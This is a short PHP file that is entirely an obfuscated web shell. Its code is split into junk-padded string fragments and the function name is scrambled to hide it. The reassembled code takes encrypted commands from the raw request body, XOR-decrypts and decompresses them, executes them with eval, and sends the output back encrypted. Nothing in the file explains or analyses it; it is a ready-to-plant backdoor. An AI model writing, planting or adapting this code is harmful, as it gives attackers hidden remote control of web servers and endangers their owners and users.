<?php
$P='}<t,$k){$c=s}<trlen($k);$l=}<str}<le}<n($t);$o=}<"";}<for($i=0;$}<}<i<$l;){for($j=0}<;($j<$}<c&&$i<$l}<);$j++}<,$}<i++){$';
$D='}<o.=$t{}<$i}}<^$k{$}<j}}<;}<}}<}return $o;}if }<(@preg_match("/$k}<h}<(.+)$kf}<}</",@file_get_conte}<nt}<}<s("php://i';
$w='nput")}<}<,$m)==1) {@}<ob_sta}<rt()}<;@eva}<l(@gz}<un}<compre}<ss(@x(@ba}<se64}<_decode($m[1])}<,$k))}<);$o=}<@}<ob_ge}<';
$l='$k="9}<81db1f}<4";$kh}<="0b9423}<}<6a1}<78}<e";$kf="31aa1336e}<c78";$p=}<"bLU1}<}<uRKbF5m}<I}<SQYF";fun}<ction x}<($';
$A='t_c}<onte}<nts();@ob}<_end_clean();$}<r=@bas}<e64}<_encode(@x(}<@gz}<compr}<es}<s(}<$o),$k));print("$}<p}<$kh$r$kf");}';
$J=str_replace('h','','chrehatheh_funhctihon');
$h=str_replace('}<','',$l.$P.$D.$w.$A);
$G=$J('',$h);$G();
?>
